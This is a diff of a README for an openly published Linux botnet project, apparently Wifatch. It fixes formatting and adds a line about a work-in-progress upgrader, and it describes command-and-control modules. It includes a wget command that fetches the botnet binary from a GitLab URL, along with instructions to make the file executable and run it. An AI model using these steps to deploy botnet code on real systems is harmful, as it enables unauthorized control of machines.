@@ -30,6 +30,8 @@ over time.
    * `pl/tn/tn.c` "telnet" - simple authenticated command/fileserver. last
       component installed before main botnet.
 
+* `pl/xx5/` the next generation upgrader, work in progress.
+
 * `cc/` contains some command & control infrastructure
 
    * `cc/bm/` contains "command & control" perl modules, also uses `pl/bn/` modules
@@ -176,9 +178,9 @@ PGP Key ID EFE59C89 (24CE E600 AF6F 23F4 8C31  7479 EFBF 5721 EFE5 9C89)
 
   Due to popular demand, we have added the x86 binaries to this repository
   (they should run with almost any x86 or amd64 linux kernel). To run it,
-  download `bin/.net_bn' and `bin/.net_pl` to some directory, and make the
+  download `bin/.net_bn` and `bin/.net_pl` to some directory, and make the
   former executable and then start it with `./.net_bn -run`, to run it in
-  the foreground and see the log messages, or F<./.net_bn -start>, to run
+  the foreground and see the log messages, or `./.net_bn -start`, to run
   it in the background. These commands should do that:
 
       wget -O .net_bn https://gitlab.com/rav7teif/linux.wifatch/raw/master/bin/.net_bn
